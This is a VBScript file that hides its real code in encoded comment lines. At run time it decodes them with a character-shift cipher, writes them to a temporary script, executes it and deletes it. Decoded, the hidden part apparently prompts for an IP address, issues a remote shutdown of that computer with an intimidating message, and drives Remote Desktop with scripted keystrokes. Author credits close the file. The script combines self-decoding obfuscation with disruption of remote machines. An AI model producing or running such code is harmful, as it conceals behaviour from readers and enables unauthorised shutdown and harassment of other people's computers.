On Error Resume Next
Set objWSH = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFSO1 = CreateObject("Scripting.FileSystemObject")
Set objTCode = objFSO1.CreateTextFile("tmp.vbs", TRUE)
Set objCode = objFSO.OpenTextFile("Shutter.vbs")
Do Until objCode.AtEndOfStream
strTMP = objCode.ReadLine
For x = 1 to Len(strTMP)
strCR = Mid(strTMP, x, 1)
If strCR <> "'" Then
If Asc(strCR) < 32 Then
intCR = ((Asc(strCR) + 255) / 2) - 7
Else
intCR = (Asc(strCR) / 2) - 7
End If
strCR = chr(intCR)
End If
strCode = strCode & strCR
Next
If Mid(strCode, 1, 1) = "'" Then
objTCode.WriteLine Mid(strCode, 2, Len(strCode) - 1)
End If
strCode = VBNullString
Loop
objTCode.Close
objWSH.run "tmp.vbs"
wscript.sleep 1000
objFSO.DeleteFile "tmp.vbs", TRUE
'ÖàèNìÒâ¼´žfNôöò ®fNôöò”¨–fNôöòªìöØ
'
'ôØöNìÒâ¼´žNNˆNÔòØÐöØìÒâØÔö^RüôÔòàîöjôÞØææR`
'ôöò”¨–NˆNRôÞøöÖìüêNhòNhèNÆÆR
'ôöòªìöØNˆNR êÚìòèÐöàìêNôôøòÐêÔØNàôNÐîîæàêÜN¨ª–¶¬²ÀNîÐöÔÞØôNöìNìøòNèÐÔÞàêØjN–ìNª¬¶NôÞøöÖìüêNöÞØNÔìèîøöØòNìòNæìÜNøôNìøöjNšÐàæøòØNöìNÔìèîæNüàææNòØôøæöNàêNìøòNÐÔÔìøêöNÒØàêÜNÖàôÐÒæØÖjN´ØèîØòNšàR
'
'ÖìNüÞàæØNôöò ®N†ŠNRP’¬²¶PR
'üôÔòàîöjØÔÞìNR¶ìN˜êÖN´ÔòàîöN˜êöØòN\P’¬²¶P\R
'üôÔòàîöjØÔÞìNR®æØÐôØN˜êöØòN ®‚R
'ôöò ®NˆNüôÔòàîöjôöÖàêjòØÐÖæàêØ
'
'àÚNôöò ®N†ŠNRP’¬²¶PRNöÞØê
'ìÒâ¼´žjòøêNôöòÔèÖNZNôöò ®NZNRNhöNprnNhÔNRNZNÔÞò^tv`NZNôöòªìöØNZNÔÞò^tv`NZNRNhÚR
'\èôÜÒìþNôöò ®
'ìÒâ¼´žjòøêNRîàêÜNRNZNôöò ®NZNRNhöR
'ìÒâ¼´žjòøêNRèôöôÔR
'üôÔòàîöjôæØØîNrnnn
'ìÒâ¼´žjÐîîÐÔöàúÐöØNR²ØèìöØN–ØôäöìîN”ìêêØÔöàìêR
'üôÔòàîöjôæØØîNpnnn
'ìÒâ¼´žjôØêÖäØôNôöò ®
'ØêÖNàÚ
'æììî
'
'
'ôØöNìÒâ¼´žNˆNêìöÞàêÜ
'üôÔòàîöjðøàö
'
'\\ºhhºN´ÔòàîöN¼òàööØêN’N¤ÞòàôöìôNºhhº\\
'\\ºhhºNºÐèîòØ¨ÐêN´öøÖàìôN êÔjNºhhº\\
'\\ºhhºNüüüjúÐèîòØèÐêôöøÖàìôjÔìèNºhhº\\
